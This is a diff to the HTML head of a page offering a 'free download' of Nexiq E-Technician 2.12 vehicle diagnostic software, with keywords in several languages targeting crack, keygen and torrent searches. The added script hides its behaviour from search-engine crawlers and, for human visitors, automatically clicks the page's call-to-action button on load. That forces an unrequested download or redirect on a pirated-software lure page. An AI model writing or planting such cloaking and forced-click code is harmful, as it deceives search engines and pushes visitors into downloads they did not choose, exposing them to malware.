@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nexiq E-Technician 2.12 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Nexiq E-Technician 2.12 2024 diagnostic software for all vehicle types. Free download available. Supports multiple NEXIQ devices and Windows 10/11.">
     <meta name="keywords" content="Nexiq E-Technician 2.12, Nexiq E-Technician 2.12 2024, Nexiq diagnostic software, Nexiq E-Technician 2.12 download, Nexiq E-Technician 2.12 free download, Nexiq E-Technician 2.12 crack, Nexiq E-Technician 2.12 keygen, Nexiq truck diagnostic software, Nexiq USB-Link 2 supported, Nexiq Blue-Link supported, Nexiq diagnostic software 2024, Nexiq diagnostic software free download, Nexiq diagnostic software download free, Nexiq diagnostic software crack, Nexiq truck diagnostics, Nexiq E-Technician 2.12 English download, Nexiq E-Technician 2.12 license unlimited, Nexiq diagnostic software heavy-duty, скачать Nexiq E-Technician 2.12, скачать Nexiq E-Technician 2.12 бесплатно, Nexiq диагностическое программное обеспечение, скачать Nexiq диагностическое программное обеспечение, Nexiq E-Technician 2.12 скачать бесплатно, Nexiq E-Technician 2.12 ключ, Nexiq E-Technician 2.12 торрент, Download Nexiq E-Technician 2.12 high speed, Nexiq E-Technician 2.12 ключ активации, скачать Nexiq E-Technician 2.12 ключ бесплатно, Nexiq E-Technician 2.12 українською, Завантажити Nexiq E-Technician 2.12 безкоштовно">
     <style>
